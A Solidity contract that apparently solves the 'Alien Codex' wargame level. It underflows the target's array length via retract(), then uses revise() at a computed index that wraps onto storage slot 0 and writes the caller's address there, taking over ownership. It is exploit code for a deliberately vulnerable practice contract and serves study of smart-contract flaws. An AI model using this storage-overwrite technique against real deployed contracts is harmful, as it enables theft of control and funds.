// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
  function makeContact() external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}
contract AttackAlienCodex{
  IAlienCodex aliencodex;

  constructor(address _aliencodexAddress){
    aliencodex = IAlienCodex(_aliencodexAddress);
  }

  function attack() public{
    uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
    bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
    aliencodex.makeContact();
    aliencodex.retract();
    aliencodex.revise(index, myAddress);
  }
}